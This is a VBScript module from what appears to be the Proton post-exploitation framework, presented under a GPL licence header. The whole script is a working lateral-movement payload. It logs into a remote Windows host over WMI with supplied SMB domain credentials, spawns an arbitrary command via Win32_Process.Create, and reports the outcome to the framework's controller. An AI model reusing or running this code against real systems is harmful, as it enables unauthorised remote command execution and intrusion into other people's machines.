'            ---------------------------------------------------
'                             Proton Framework              
'            ---------------------------------------------------
'                Copyright (C) <2019-2020>  <Entynetproject>
'
'        This program is free software: you can redistribute it and/or modify
'        it under the terms of the GNU General Public License as published by
'        the Free Software Foundation, either version 3 of the License, or
'        any later version.
'
'        This program is distributed in the hope that it will be useful,
'        but WITHOUT ANY WARRANTY; without even the implied warranty of
'        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
'        GNU General Public License for more details.
'
'        You should have received a copy of the GNU General Public License
'        along with this program.  If not, see <http://www.gnu.org/licenses/>.

sub ExecWMI
    set objSWbemLocator = CreateObject("WbemScripting.SWbemLocator")
    'MsgBox "o"
    set objSWbemServices = objSWbemLocator.ConnectServer("~RHOST~", "root\cimv2", "~SMBDOMAIN~\~SMBUSER~", "~SMBPASS~")

    objSWbemServices.Security_.ImpersonationLevel = 3
    objSWbemServices.Security_.AuthenticationLevel = 6

    set objProcess = objSWbemServices.Get("Win32_Process")
    errReturn = objProcess.Create("~CMD~", null, null, intProcessID)
end sub

dim errReturn
errReturn = -1

ExecWMI
KoReportWork errReturn
KoExit
